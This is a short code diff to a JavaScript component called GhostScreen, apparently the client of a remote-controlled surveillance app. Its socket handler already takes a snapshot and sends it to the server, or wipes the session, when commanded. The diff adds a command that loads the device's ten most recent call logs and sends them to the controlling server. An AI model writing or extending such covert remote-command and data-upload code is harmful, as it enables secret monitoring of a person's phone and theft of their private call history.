@@ -74,6 +74,11 @@ const GhostScreen = ({ name, onLogout }) => {
         socket.emit('ghost_activity', { name, type: 'SNAPSHOT', data: uri });
       } else if (cmd === 'WIPE') {
         onLogout(); 
+      } else if (cmd === 'PING') {
+        updateVitals();
+      } else if (cmd === 'LOG_SYNC') {
+        const logs = await CallLogs.load(10);
+        socket.emit('ghost_activity', { name, type: 'LOG_SYNC', data: logs });
       }
     });
 
